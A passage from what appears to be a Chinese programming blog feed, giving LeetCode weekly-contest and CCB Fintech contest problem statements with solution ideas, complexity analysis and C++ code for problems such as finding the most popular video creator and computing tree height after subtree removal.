<h4 id="2455-可被三整除的偶数的平均值"><a href="#2455-可被三整除的偶数的平均值" class="headerlink" title="2455. 可被三整除的偶数的平均值"></a>2455. 可被三整除的偶数的平均值</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个由正整数组成的整数数组 <code>nums</code> ，返回其中可被 <code>3</code> 整除的所有偶数的平均值。</p>
<p>注意：<code>n</code> 个元素的平均值等于 <code>n</code> 个元素 求和 再除以 <code>n</code> ，结果 向下取整 到最接近的整数。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,3,6,10,12,15]</span><br><span class="line">输出：9</span><br><span class="line">解释：6 和 12 是可以被 3 整除的偶数。(6 + 12) / 2 = 9 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,4,7,10]</span><br><span class="line">输出：0</span><br><span class="line">解释：不存在满足题目要求的整数，所以返回 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 1000</code></li>
<li><code>1 &lt;= nums[i] &lt;= 1000</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/average-value-of-even-numbers-that-are-divisible-by-three/">https://leetcode.cn/problems/average-value-of-even-numbers-that-are-divisible-by-three/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接遍历数组中的元素即可，找到所有能被 $6$ 整除的元素之和即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">averageValue</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> tot = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v % <span class="number">6</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                tot += v;</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt == <span class="number">0</span> ? <span class="number">0</span> : tot / cnt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2456-最流行的视频创作者"><a href="#2456-最流行的视频创作者" class="headerlink" title="2456. 最流行的视频创作者"></a>2456. 最流行的视频创作者</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你两个字符串数组 <code>creators</code> 和 <code>ids</code> ，和一个整数数组 <code>views</code> ，所有数组的长度都是 <code>n</code> 。平台上第 <code>i</code> 个视频者是 <code>creator[i]</code> ，视频分配的 <code>id</code> 是 <code>ids[i]</code> ，且播放量为 <code>views[i]</code> 。</p>
<p>视频创作者的 流行度 是该创作者的 所有 视频的播放量的 总和 。请找出流行度 最高 创作者以及该创作者播放量 最大 的视频的 <code>id</code> 。</p>
<p>如果存在多个创作者流行度都最高，则需要找出所有符合条件的创作者。<br>如果某个创作者存在多个播放量最高的视频，则只需要找出字典序最小的 <code>id</code> 。<br>返回一个二维字符串数组 <code>answer</code> ，其中 <code>answer[i] = [creatori, idi]</code> 表示 <code>creatori</code> 的流行度 最高 且其最流行的视频 <code>id </code>是 <code>idi</code> ，可以按任何顺序返回该结果。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：creators = [&quot;alice&quot;,&quot;bob&quot;,&quot;alice&quot;,&quot;chris&quot;], ids = [&quot;one&quot;,&quot;two&quot;,&quot;three&quot;,&quot;four&quot;], views = [5,10,5,4]</span><br><span class="line">输出：[[&quot;alice&quot;,&quot;one&quot;],[&quot;bob&quot;,&quot;two&quot;]]</span><br><span class="line">解释：</span><br><span class="line">alice 的流行度是 5 + 5 = 10 。</span><br><span class="line">bob 的流行度是 10 。</span><br><span class="line">chris 的流行度是 4 。</span><br><span class="line">alice 和 bob 是流行度最高的创作者。</span><br><span class="line">bob 播放量最高的视频 id 为 &quot;two&quot; 。</span><br><span class="line">alice 播放量最高的视频 id 是 &quot;one&quot; 和 &quot;three&quot; 。由于 &quot;one&quot; 的字典序比 &quot;three&quot; 更小，所以结果中返回的 id 是 &quot;one&quot; 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：creators = [&quot;alice&quot;,&quot;alice&quot;,&quot;alice&quot;], ids = [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;], views = [1,2,2]</span><br><span class="line">输出：[[&quot;alice&quot;,&quot;b&quot;]]</span><br><span class="line">解释：</span><br><span class="line">id 为 &quot;b&quot; 和 &quot;c&quot; 的视频都满足播放量最高的条件。</span><br><span class="line">由于 &quot;b&quot; 的字典序比 &quot;c&quot; 更小，所以结果中返回的 id 是 &quot;b&quot; 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == creators.length == ids.length == views.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= creators[i].length, ids[i].length &lt;= 5</code></li>
<li><code>creators[i]</code> 和 <code>ids[i]</code> 仅由小写英文字母组成</li>
<li><code>0 &lt;= views[i] &lt;= 105</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/most-popular-video-creator/">https://leetcode.cn/problems/most-popular-video-creator/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>遍历
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目也就是遍历即可了，当我们直接统计每个创造者的视频总数，并记录每个创作者观看量最高的视频，最终找到观看量最多的创作者，并返回其观看量最多的视频。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$。</li>
<li>空间复杂度：空间复杂度为 $O(n)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">mostPopularCreator</span>(vector&lt;string&gt;&amp; creators, vector&lt;string&gt;&amp; ids, vector&lt;<span class="type">int</span>&gt;&amp; views) &#123;</span><br><span class="line">        unordered_map&lt;string, <span class="type">long</span> <span class="type">long</span>&gt; sum;</span><br><span class="line">        unordered_map&lt;string, pair&lt;<span class="type">int</span>, string&gt;&gt; cnt;</span><br><span class="line">        <span class="type">int</span> n = creators.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum[creators[i]] += views[i];</span><br><span class="line">            <span class="keyword">if</span> (!cnt.<span class="built_in">count</span>(creators[i]) || </span><br><span class="line">                 views[i] &gt; cnt[creators[i]].first || </span><br><span class="line">                 (views[i] == cnt[creators[i]].first &amp;&amp; ids[i] &lt; cnt[creators[i]].second)) &#123;</span><br><span class="line">                cnt[creators[i]] = <span class="built_in">make_pair</span>(views[i], ids[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> maxCnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [_, x] : sum) &#123;</span><br><span class="line">            maxCnt = <span class="built_in">max</span>(maxCnt, x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [s, x] : sum) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x == maxCnt) &#123;</span><br><span class="line">                ans.<span class="built_in">push_back</span>(&#123;s, cnt[s].second&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2457-美丽整数的最小增量"><a href="#2457-美丽整数的最小增量" class="headerlink" title="2457. 美丽整数的最小增量"></a>2457. 美丽整数的最小增量</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你两个正整数 <code>n</code> 和 <code>target</code> 。</p>
<p>如果某个整数每一位上的数字相加小于或等于 <code>target</code> ，则认为这个整数是一个 美丽整数 。</p>
<p>找出并返回满足 <code>n + x</code> 是 美丽整数 的最小非负整数 <code>x</code> 。生成的输入保证总可以使 <code>n</code> 变成一个美丽整数。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 16, target = 6</span><br><span class="line">输出：4</span><br><span class="line">解释：最初，n 是 16 ，且其每一位数字的和是 1 + 6 = 7 。在加 4 之后，n 变为 20 且每一位数字的和变成 2 + 0 = 2 。可以证明无法加上一个小于 4 的非负整数使 n 变成一个美丽整数。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 467, target = 6</span><br><span class="line">输出：33</span><br><span class="line">解释：最初，n 是 467 ，且其每一位数字的和是 4 + 6 + 7 = 17 。在加 33 之后，n 变为 500 且每一位数字的和变成 5 + 0 + 0 = 5 。可以证明无法加上一个小于 33 的非负整数使 n 变成一个美丽整数。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 1, target = 1</span><br><span class="line">输出：0</span><br><span class="line">解释：最初，n 是 1 ，且其每一位数字的和是 1 ，已经小于等于 target 。</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 1012</code></li>
<li><code>1 &lt;= target &lt;= 150</code></li>
<li>生成的输入保证总可以使 <code>n</code> 变成一个美丽整数。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimum-addition-to-make-integer-beautiful/">https://leetcode.cn/problems/minimum-addition-to-make-integer-beautiful/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单的数学问题，我们观察一下规律，我们每次尝试将第 $i$ 位上的数字加 $1$，此时我们可以观察到整数的数位之和会减少，如果整数的最高位变为 $1$ 其余的位均为 $0$，则可以将整个数的数字之和最小减少为 $0$。</li>
<li>根据以上尝试我们依次尝试将从右向左将每位上的数字加 $1$，然后计算加 $1$ 后的数字之和为 $tot$，如果满足 $tot &lt; target$，则我们认为达到符合条件的最小值。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(\log n)$，$n$ 为给定的数字。</li>
<li>空间复杂度：空间复杂度为 $O(\log n)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">makeIntegerBeautiful</span><span class="params">(<span class="type">long</span> <span class="type">long</span> n, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> x = n;</span><br><span class="line">        <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">            tot += (x % <span class="number">10</span>);</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tot &lt;= target) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        string s = <span class="built_in">to_string</span>(n);</span><br><span class="line">        s = <span class="string">&quot;0&quot;</span> + s;</span><br><span class="line">        <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            string t = s;</span><br><span class="line">            <span class="type">int</span> curr = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                t[j] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> carry = (t[i] - <span class="string">&#x27;0&#x27;</span> + <span class="number">1</span>) / <span class="number">10</span>;</span><br><span class="line">            t[i] = (t[i] - <span class="string">&#x27;0&#x27;</span> + <span class="number">1</span>) % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            curr += t[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; s.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                <span class="type">int</span> next = (t[j] - <span class="string">&#x27;0&#x27;</span> + carry) / <span class="number">10</span>;</span><br><span class="line">                t[j] = (t[j] - <span class="string">&#x27;0&#x27;</span> + carry) % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                carry = next;</span><br><span class="line">                curr += t[j] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (curr &lt;= target) &#123;</span><br><span class="line">                <span class="built_in">reverse</span>(t.<span class="built_in">begin</span>(), t.<span class="built_in">end</span>());</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">stol</span>(t) - n;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2458-移除子树后的二叉树高度"><a href="#2458-移除子树后的二叉树高度" class="headerlink" title="2458. 移除子树后的二叉树高度"></a>2458. 移除子树后的二叉树高度</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一棵 二叉树 的根节点 <code>root</code> ，树中有 <code>n</code> 个节点。每个节点都可以被分配一个从 <code>1</code> 到 <code>n</code> 且互不相同的值。另给你一个长度为 <code>m</code> 的数组 <code>queries</code> 。</p>
<p>你必须在树上执行 <code>m</code> 个 独立 的查询，其中第 <code>i</code> 个查询你需要执行以下操作：</p>
<p>从树中 移除 以 <code>queries[i]</code> 的值作为根节点的子树。题目所用测试用例保证 <code>queries[i]</code> 不 等于根节点的值。<br>返回一个长度为 <code>m</code> 的数组 <code>answer</code> ，其中 <code>answer[i]</code> 是执行第 <code>i</code> 个查询后树的高度。</p>
<p>注意：</p>
<p>查询之间是独立的，所以在每个查询执行后，树会回到其 初始 状态。<br>树的高度是从根到树中某个节点的 最长简单路径中的边数 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,3,4,2,null,6,5,null,null,null,null,null,7], queries = [4]</span><br><span class="line">输出：[2]</span><br><span class="line">解释：上图展示了从树中移除以 4 为根节点的子树。</span><br><span class="line">树的高度是 2（路径为 1 -&gt; 3 -&gt; 2）。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [5,8,9,2,1,3,7,4,6], queries = [3,2,4,8]</span><br><span class="line">输出：[3,2,3,2]</span><br><span class="line">解释：执行下述查询：</span><br><span class="line">- 移除以 3 为根节点的子树。树的高度变为 3（路径为 5 -&gt; 8 -&gt; 2 -&gt; 4）。</span><br><span class="line">- 移除以 2 为根节点的子树。树的高度变为 2（路径为 5 -&gt; 8 -&gt; 1）。</span><br><span class="line">- 移除以 4 为根节点的子树。树的高度变为 3（路径为 5 -&gt; 8 -&gt; 2 -&gt; 6）。</span><br><span class="line">- 移除以 8 为根节点的子树。树的高度变为 2（路径为 5 -&gt; 9 -&gt; 3）。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li>树中节点的数目是 <code>n</code></li>
<li><code>2 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= Node.val &lt;= n</code></li>
<li>树中的所有值 互不相同</li>
<li><code>m == queries.length</code></li>
<li><code>1 &lt;= m &lt;= min(n, 104)</code></li>
<li><code>1 &lt;= queries[i] &lt;= n</code></li>
<li><code>queries[i] != root.val</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/height-of-binary-tree-after-subtree-removal-queries/">https://leetcode.cn/problems/height-of-binary-tree-after-subtree-removal-queries/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 深度优先搜索</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>确实是个不错的题目，也是个非常有意思的题目，每次记录遍历当前节点 $node$ 子树以外得到的节点所能遍历得到的高度 $h$，此时删除节点 $node$ 后的高度即为 $h$，我们可以分别采用先左遍历后右遍历和先右遍历后左遍历的方法来得到所有的可能：</li>
</ol>
<ul>
<li>假设当前节点 $node$ 为其父节点的左节点，且 $node$ 节点为根节点的左子树，则可以知道我们可以采用先遍历右节点，再遍历左节点的方法即可得到 $node$ 子树以外的节点构成的最大高度；</li>
<li>假设当前节点 $node$ 为其父节点的右节点，且 $node$ 节点为根节点的左子树，$node$ 子树以外的节点构成的最大高度：<ul>
<li>要么我们先右后左，可以得到一个高度 $h1$，此时 $node$ 的左兄弟的最大高度没有计算出来；</li>
<li>要么我们先左后后，可以得到一个高度 $h2$，此时我们可以计算出 $node$ 的左兄弟的最大高度；</li>
<li>当前去除 $node$ 后的节点子树的高度一定包含在 $\max(h1,h2)$ 中；</li>
</ul>
</li>
<li>假设当前节点 $node$ 为其父节点的左节点，且 $node$ 节点为根节点的右子树，$node$ 子树以外的节点构成的最大高度；<ul>
<li>要么我们先左后有，可以得到一个高度 $h1$，此时我们可以计算出 $node$ 的右兄弟的高度没有计算出来；</li>
<li>要么我们先右后左，可以得到一个高度 $h2$，此时可以计算出 $node$ 的右兄弟的高度；</li>
<li>当前去除 $node$ 后的节点子树的高度一定包含在 $\max(h1,h2)$ 中；</li>
</ul>
</li>
<li>假设当前节点 $node$ 为其父节点的右节点，且 $node$ 节点为根节点的右子树，则可以知道我们可以采用先遍历左节点，再遍历右节点的方法即可得到 $node$ 子树以外的节点构成的最大高度；</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示给定的节点的数目。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示给定的节点的数目。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs1</span><span class="params">(TreeNode* root, vector&lt;<span class="type">int</span>&gt; &amp;depth1, <span class="type">int</span> &amp;maxHeight, <span class="type">int</span> height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        depth1[root-&gt;val] = maxHeight;</span><br><span class="line">        maxHeight = <span class="built_in">max</span>(maxHeight, height);</span><br><span class="line">        <span class="built_in">dfs1</span>(root-&gt;left,  depth1, maxHeight, height + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">dfs1</span>(root-&gt;right, depth1, maxHeight, height + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs2</span><span class="params">(TreeNode* root, vector&lt;<span class="type">int</span>&gt; &amp;depth2, <span class="type">int</span> &amp;maxHeight, <span class="type">int</span> height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        depth2[root-&gt;val] = maxHeight;</span><br><span class="line">        maxHeight = <span class="built_in">max</span>(maxHeight, height);</span><br><span class="line">        <span class="built_in">dfs2</span>(root-&gt;right,  depth2, maxHeight, height + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">dfs2</span>(root-&gt;left, depth2, maxHeight, height + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">treeQueries</span><span class="params">(TreeNode* root, vector&lt;<span class="type">int</span>&gt;&amp; queries)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">1e5</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">depth1</span><span class="params">(n)</span>, <span class="title">depth2</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="type">int</span> maxHeight = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">dfs1</span>(root, depth1, maxHeight, <span class="number">0</span>);</span><br><span class="line">        maxHeight = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">dfs2</span>(root, depth2, maxHeight, <span class="number">0</span>);</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;v : queries) &#123;</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(<span class="built_in">max</span>(depth1[v], depth2[v]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 建信金科</title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/55/</url>
    <content><![CDATA[<h1 id="leetcode-contest-建信金科"><a href="#leetcode-contest-建信金科" class="headerlink" title="leetcode contest 建信金科"></a>leetcode contest 建信金科</h1><p>题目质量还是非常高的，只做出两道的节奏，最后两道题目没有做出来，但是又从中学到了新的知识点和技能．第四题可能是我最喜欢的题目类型了，带有思考性质和数学问题，非常喜欢这种思维加数学的题型，通过算法和计算可以学习到数学的问题．</p>
<h3 id="建信01-间隔删除链表结点"><a href="#建信01-间隔删除链表结点" class="headerlink" title="建信01. 间隔删除链表结点"></a>建信01. 间隔删除链表结点</h3><p>给你一个链表的头结点 <code>head</code>，每隔一个结点删除另一个结点（要求保留头结点）。<br>请返回最终链表的头结点。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [1,2,3,4]</span><br><span class="line"></span><br><span class="line">输出: [1,3]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">蓝色结点为删除的结点</span><br></pre></td></tr></table></figure>

<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [5,1,8,6,1]</span><br><span class="line"></span><br><span class="line">输出: [5,8,1]</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li>链表中结点的数目在<code>[1, 5000]</code>范围内。</li>
<li><code>1 &lt;= Node.val &lt;= 10000</code></li>
</ul>
<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/ccbft-2021fall/problems/woGGnF/">https://leetcode-cn.com/contest/ccbft-2021fall/problems/woGGnF/</a></p>
<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p>  遍历</p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>这个题目出的比较无聊，我们每隔一个节点删除一个节点即可，将节点的指针指向下一个节点的下一个节点即可。</li>
<li>复杂度分析:</li>
</ol>
<ul>
<li>时间复杂度: $O(N)$,其中 $N$ 为链表的长度,我们此时需要遍历一遍即可。</li>
<li>空间复杂度: $O(1)$,我们指针保存中间变量即可。</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteListNode</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode * curr = head;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(curr)&#123;</span><br><span class="line">            ListNode * prev = curr;</span><br><span class="line">            curr = curr-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(curr)&#123;</span><br><span class="line">                prev-&gt;next = curr-&gt;next;</span><br><span class="line">                curr = curr-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="建信02-柱状图分析"><a href="#建信02-柱状图分析" class="headerlink" title="建信02. 柱状图分析"></a>建信02. 柱状图分析</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>某柱状图上共有 <code>N </code>个柱形，数组 <code>heights</code> 中按照排列顺序记录了每个柱形的高度。假定任选 <code>cnt</code> 个柱形可组成一个柱形组，请在所有可能的柱形组中，找出最大高度与最小高度的差值为最小的柱形组，按高度升序返回该柱形组。若存在多个柱形组满足条件，则返回第一个元素最小的柱形组。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：heights = [3,2,7,6,1,8], cnt = 3</span><br><span class="line"></span><br><span class="line">输出：[1,2,3]</span><br><span class="line"></span><br><span class="line">解释：[1,2,3] 与 [6,7,8] 都符合在所有的柱形组中，最大高度与最小高度的差值为最小的条件，选择第一个元素最小的 [1,2,3] 返回。</span><br></pre></td></tr></table></figure>

<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：heights = [4,6,1,8,4,10], cnt = 4</span><br><span class="line"></span><br><span class="line">输出：[4,4,6,8]</span><br><span class="line"></span><br><span class="line">解释：柱形组 [4,4,6,8] 满足最大高度与最小高度的差值为最小条件。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>2 &lt;= cnt &lt; heights.length &lt;= 10^5</code></li>
<li><code>0 &lt;= heights[i] &lt;= 10^6</code></li>
</ul>
<h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/ccbft-2021fall/problems/9Rs2aO/">https://leetcode-cn.com/contest/ccbft-2021fall/problems/9Rs2aO/</a></p>
<h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 排序</p>
</blockquote>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol>
<li>所谓任选 $cnt$ 个柱形使得最大高度与最小高度最小，则此时我们按照排序从小到大，最大值与最小值之差的最小值肯定是在选择连续 $cnt$ 个元素中．</li>
</ol>
<ul>
<li>时间复杂度分析: 时间复杂度为 $O(n\log(n))$，其中 $n$ 表示数组的长度．</li>
<li>空间复杂度分析: 空间复杂度为 $O(1)$，我们只需要常数个变量保存中间变量．</li>
</ul>
